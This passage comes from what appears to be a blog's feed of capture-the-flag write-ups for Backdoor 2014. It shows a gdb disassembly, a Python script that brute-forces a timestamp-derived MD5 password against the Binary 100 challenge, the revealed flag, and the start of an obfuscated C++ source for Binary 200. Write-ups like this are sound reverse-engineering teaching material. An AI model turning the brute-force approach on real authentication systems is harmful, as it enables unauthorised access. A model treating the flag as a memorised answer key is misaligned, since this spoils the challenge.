style=&quot;color:#d08770;&quot;&gt;228&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401095 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;225&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbx
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0000000000401098 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;228&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lea    &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x000000000040109c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;232&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x000000000040109f &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;235&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: callq  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x400dc0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;_ZNSsD1Ev@plt&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x00000000004010a4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;240&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;jmp    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x4010a9 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;_Z25passwordFromUnixTimestampl&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;245&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x00000000004010a6 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;242&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbx
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x00000000004010a9 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;245&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;lea    &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x1a0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x00000000004010b0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;252&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x00000000004010b3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;255&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: callq  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x400e70 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;_ZNSt18basic_stringstreamIcSt11&lt;&#x2F;span&gt;&lt;span&gt;---&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;Type &amp;lt;return&amp;gt; to continue&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;or &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;q &amp;lt;return&amp;gt; to quit&lt;&#x2F;span&gt;&lt;span&gt;---
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;char_traitsIcESaIcEED1Ev@plt&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x00000000004010b8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;260&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rbx&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x00000000004010bb &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;263&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;mov    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rax&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rdi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x00000000004010be &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;266&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;gt;: callq  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x400eb0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;lt;_Unwind_Resume@plt&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;End of assembler dump.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt; 
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;End of assembler dump.
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The unix time stamp is a way to track time as a running of total seconds. This count starts at the Unix Epoch on January 1st, 1970 at UTC. So firstly lets convert the time given in UTC (It&#x27;s in Indian Standard Time). For conversion I used
+&lt;a href=&quot;http:&#x2F;&#x2F;www.unixtimestamp.com&#x2F;index.php&quot;&gt;http:&#x2F;&#x2F;www.unixtimestamp.com&#x2F;index.php&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;When you convert it in UTC ( Universal time ) you get:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;DATE (M&#x2F;D&#x2F;Y @ h:m:s): 03 &#x2F; 14 &#x2F; 14 @ 2:50:00pm UTC 
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;And UnixTimestamp for this date and time is 1394808600.&lt;&#x2F;p&gt;
+&lt;p&gt;Ok, that should be useful, so I scrolled down a bit to check other functions, and I found this part interesting as well&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;http:&#x2F;&#x2F;2.bp.blogspot.com&#x2F;-jFM8zABw-L0&#x2F;UzBNU_tDIDI&#x2F;AAAAAAAAACo&#x2F;CTu-_h2Rr7M&#x2F;s1600&#x2F;writeup1.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The program uses the MD5 function to encode and decode something. Since it only has one input, it must be our user input or the password we need to provide as an argument (&lt;code&gt;argv&lt;&#x2F;code&gt;).&lt;&#x2F;p&gt;
+&lt;p&gt;I wrote a small Python script to calculate all Unix timestamps within a given period. It starts from the initial timestamp &lt;code&gt;1394808600&lt;&#x2F;code&gt;&lt;br &#x2F;&gt;
+(this corresponds to the date and time &lt;strong&gt;03&#x2F;14&#x2F;2014 @ 2:50:00 PM UTC&lt;&#x2F;strong&gt;) and increments by 1 for each subsequent timestamp.&lt;&#x2F;p&gt;
+&lt;p&gt;The script encodes each timestamp in MD5, tries it as the password (&lt;code&gt;argv&lt;&#x2F;code&gt;), and repeats this process for every timestamp within the 20-minute period.&lt;br &#x2F;&gt;
+The last timestamp is &lt;code&gt;1394808600 + 20 * 60&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;The script source is:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;subprocess
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;os
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;hashlib
+&lt;&#x2F;span&gt;&lt;span&gt; 
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;computeMD5hash&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;string&lt;&#x2F;span&gt;&lt;span&gt;):
+&lt;&#x2F;span&gt;&lt;span&gt;    m = hashlib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;md5&lt;&#x2F;span&gt;&lt;span&gt;()
+&lt;&#x2F;span&gt;&lt;span&gt;    m.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;update&lt;&#x2F;span&gt;&lt;span&gt;(string.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;m.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()
+&lt;&#x2F;span&gt;&lt;span&gt; 
+&lt;&#x2F;span&gt;&lt;span&gt;start_timestamp=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1394808600
+&lt;&#x2F;span&gt;&lt;span&gt; 
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1200&lt;&#x2F;span&gt;&lt;span&gt;):
+&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;trying with timestamp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; % start_timestamp
+&lt;&#x2F;span&gt;&lt;span&gt; execute=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;.&#x2F;bin100 &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;computeMD5hash&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(start_timestamp))
+&lt;&#x2F;span&gt;&lt;span&gt; os.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;system&lt;&#x2F;span&gt;&lt;span&gt;(execute)
+&lt;&#x2F;span&gt;&lt;span&gt; start_timestamp+=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;When I ran it I got the flag.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;http:&#x2F;&#x2F;2.bp.blogspot.com&#x2F;-pM78sUjs97s&#x2F;UzBNYaDHGMI&#x2F;AAAAAAAAACw&#x2F;nDjuouLjyDA&#x2F;s1600&#x2F;writeup3.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Flag for bin100: &lt;strong&gt;94958e1c10707728ef965fe850eb98a1&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Backdoor 2014 - Binary 200</title>
+        <published>2014-03-24T00:00:00+00:00</published>
+        <updated>2014-03-24T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              spiperac
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://spiperac.dev/posts/2014-3-24-backdoor-2014-binary-200/"/>
+        <id>https://spiperac.dev/posts/2014-3-24-backdoor-2014-binary-200/</id>
+        
+        <content type="html" xml:base="https://spiperac.dev/posts/2014-3-24-backdoor-2014-binary-200/">&lt;p&gt;This time, we had to deal with an alcoholic.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;task&quot;&gt;Task:&lt;&#x2F;h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&quot;Jill was high after consuming ( 2^3 ) glasses of alcohol. In this state, he wrote a C++ program to hide a message, but he doesn&#x27;t remember it now.&lt;br &#x2F;&gt;
+Help him recover it. He managed to write a single line of comment.&quot;&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;We received the source code in a file called &lt;code&gt;obfuscated.cpp&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;source-code&quot;&gt;Source Code:&lt;&#x2F;h3&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;cstdio&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;cstdlib&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;l101&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;rand&lt;&#x2F;span&gt;&lt;span&gt;()%a
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;zlz1 bbb
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;zz mmm
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;zzz mlm
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;bsd gbbrsh
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;xx &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;void
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;backdoor \m&#x2F;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;bbb cfc
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;ffff ff
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;ads using
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;un unfortunately
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;fff main
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;gu brnf**k
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;l10l cfc
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;mmm &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;void
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;bbbb cfc
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;vgg &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;long long
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;bub std
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;mlm printf
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;ffffff f
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;lj1 dsnt
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;bmB support
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;cfc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;nv guu
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;aa namespace
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;m1m inff
+&lt;&#x2F;span&gt;&lt;span&gt;ads aa bub;
+&lt;&#x2F;span&gt;&lt;span&gt;xx &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;ffff&lt;&#x2F;span&gt;&lt;span&gt;(), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fffff&lt;&#x2F;span&gt;&lt;span&gt;();
+&lt;&#x2F;span&gt;&lt;span&gt;mmm &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;ggg&lt;&#x2F;span&gt;&lt;span&gt;();
+&lt;&#x2F;span&gt;&lt;span&gt;vgg f = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x7265616c6c795f69&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;zlz1 ccc[] = {&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x5a&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;90&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x5d&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;89&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;115&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;74&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;68&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;70&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x5c&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;79&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span 